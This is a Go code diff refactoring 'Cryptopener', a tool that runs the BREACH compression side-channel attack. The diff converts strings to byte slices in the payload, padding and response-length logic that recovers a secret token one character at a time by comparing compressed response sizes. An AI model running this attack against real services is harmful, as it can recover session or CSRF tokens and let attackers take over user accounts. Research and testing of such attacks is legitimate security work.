@@ -18,7 +18,7 @@ type Cryptopener struct {
 	mutator *TokenMutator
 	TokenLength, correctCount int
 	ResultToken []byte
-	dummyChars string
+	dummyChars []byte
 }
 
 // NewCryptopener creates new instance of Cryptopener
@@ -29,25 +29,24 @@ func NewCryptopener(address string, entry string, length int) *Cryptopener {
 		mutator: NewMutator(),
 		TokenLength: length,
 		ResultToken: []byte{},
-		dummyChars: "!#&%$*+-(){}",
+		dummyChars: []byte("!#&%$*+-(){}"),
 	}
 	return &cryptopener
 }
 
-func (p *Cryptopener) analyseResponse(response []byte) int {
+func (p *Cryptopener) analyseResponse(response []byte) int64 {
 	filename := "/tmp/tmpfile"
 	ioutil.WriteFile(filename, response, os.FileMode(0666))
 	fi, _ := os.Stat(filename)
 	size := fi.Size()
 	os.Remove(filename)
-	log.Printf("Filesize: %d", size)
-	return int(size)
+	return size
 }
 
-func (p Cryptopener) createPadding() string {
-	var ret string
+func (p Cryptopener) createPadding() []byte {
+	var ret []byte
 	for i := 0; i < 8; i++ {
-		ret = ret + string(p.dummyChars[rand.Intn(11)])
+		ret = append(ret, p.dummyChars[rand.Intn(11)])
 	}
 	return ret
 }
@@ -68,10 +67,10 @@ func Pow(x int, n int) int {
 // Run starts BREACH attack
 func (p *Cryptopener) Run() {
 	var checkBaseLength bool = true
-	var baseLength int
+	var baseLength int64
 	var mutations int = 1
 
-	var padding string
+	var padding []byte
 	for p.correctCount < p.TokenLength - 1 {
 		// new payload
 		payload := []byte{}
@@ -80,12 +79,13 @@ func (p *Cryptopener) Run() {
 		if checkBaseLength {
 			// create new payload
 			for i := 0; i < mutations; i++ {
-				payload = []byte(string(payload) + string(p.dummyChars[rand.Intn(11)]))
+				payload = append(payload, p.dummyChars[rand.Intn(11)])
 			}
+
 			payload = append(p.ResultToken, payload...)
 			log.Printf("Sending payload: %s", string(payload))
 			// send payload into a socket and then response into channel
-			response := p.client.SendMessage(string(payload), padding)
+			response := p.client.SendMessage(payload, padding)
 			baseLength = p.analyseResponse(response)
 			checkBaseLength = false
 		} else {
@@ -95,10 +95,11 @@ func (p *Cryptopener) Run() {
 			log.Printf("Sending payload: %s", string(payload))
 
 			// send payload into a socket and then response into channel
-			response := p.client.SendMessage(string(payload), padding)
+			response := p.client.SendMessage(payload, padding)
 			tempLength := p.analyseResponse(response)
 			if tempLength < baseLength {
 				p.ResultToken = append(p.ResultToken, mutpayload...)
+				// reset mutator state
 				p.mutator = NewMutator()
 				checkBaseLength = true
 				p.correctCount++
@@ -107,7 +108,7 @@ func (p *Cryptopener) Run() {
 				mutations++
 				checkBaseLength = true
 				if mutations % 2 == 0 {
-					padding = padding + p.createPadding()
+					padding = append(padding, p.createPadding()...)
 				}
 			}
 		}
